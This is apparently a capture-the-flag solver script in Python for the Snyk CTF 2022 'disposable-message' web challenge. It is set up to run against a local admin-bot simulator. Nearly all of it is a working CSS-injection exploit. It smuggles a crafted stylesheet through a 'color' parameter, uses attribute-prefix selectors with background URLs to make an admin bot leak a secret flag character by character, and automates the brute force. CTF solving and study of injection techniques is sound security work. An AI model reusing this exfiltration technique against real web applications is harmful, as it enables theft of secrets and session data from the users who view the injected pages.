#!/usr/bin/python3

# Snyk CTF 2022
# Challenge Name: disposable-message
# Author: @k1ng_pr4wn
# Write-Up: https://k1ngpr4wns-world.ghost.io/snyk-ctf-2022-disposable-message

import requests
import urllib.parse
import re
import time
import sys

# This was the original challenge URL, admin bot seems to have been disabled since then
#URL = "http://disposable-message.c.ctf-snyk.io"

# Use the local admin bot simulator
URL = "http://127.0.0.1:5000"

print(f"[+] Using URL: {URL}")

proxies = {}
#proxies = {'http':'http://127.0.0.1:8080/'}

MESSAGE = "Just an arbitrary message!"

# creates a new message and returns the id
def create_message():
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    post_data = {"message": MESSAGE}
    resp = requests.post(f"{URL}/new", headers=headers, data=post_data, proxies=proxies)
    id = re.search("(?<=fetch\('/admin-bot/)([^']+)", resp.text).group(0)
    return id

def admin_bot_view_message(id):
    url = f"{URL}/admin-bot/{urllib.parse.quote_plus(id)}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    resp = requests.post(url, headers=headers, proxies=proxies)

# leak flag using CSS selector when admin views the message
def leak_flag(ids, flag):
    id = ids[flag]
    print(f"[+] admin bot testing flag: {flag} (id = {id})")
    #print(f"[+] view message URL would be {URL}/view/{id}")
    color = f"0; }} div[data-flag^=\"{flag}\"] {{ background: url(\"{URL}/view/{id}?leak\") }}; arbitrary {{ color: #ff0000"
    new_id = create_message()
    #print(f"[+] leak message URL would be {URL}/view/{new_id}?color={urllib.parse.quote(color)}")
    admin_bot_view_message(f"{new_id}?color={urllib.parse.quote(color)}")

def message_viewed(id):
    resp = requests.get(f"{URL}/view/{id}", proxies=proxies)
    if MESSAGE in resp.text:
        return False
    return True

def test_flag(ids, FLAG):
    alphabet = "SNYK{0123456789abcdef}"

    # Create a message for each char
    for ch in alphabet:
        ids[FLAG + ch] = create_message()
        leak_flag(ids, FLAG + ch)

    # Wait a bit, you may need to extend the delay...
    seconds = 5
    print(f"[+] giving admin bot {seconds} seconds to view all the messages....")
    time.sleep(seconds)

    # test the results
    for ch in alphabet:
        id = ids[FLAG + ch]
        if message_viewed(id):
            print(f"[+] {ch} was leaked by admin bot viewing message {id}")
            return FLAG + ch
    
    return FLAG


if __name__ == '__main__':
    ids = {}

    sane = False

    # Sanity test
    while not sane:
        print("Testing admin bot sanity...")
        id = create_message()
        admin_bot_view_message(id)
        print("Waiting 2 seconds...")
        time.sleep(2)
        if not message_viewed(id):
            print("admin bot is offline...")
        else:
            print("admin bot seems sane... continuing")
            sane = True

    FLAG = ""
    
    while not "}" in FLAG:
        FLAG = test_flag(ids, FLAG)
        print(f"[+] FLAG (so far): {FLAG}")

    print("[!] Done!")
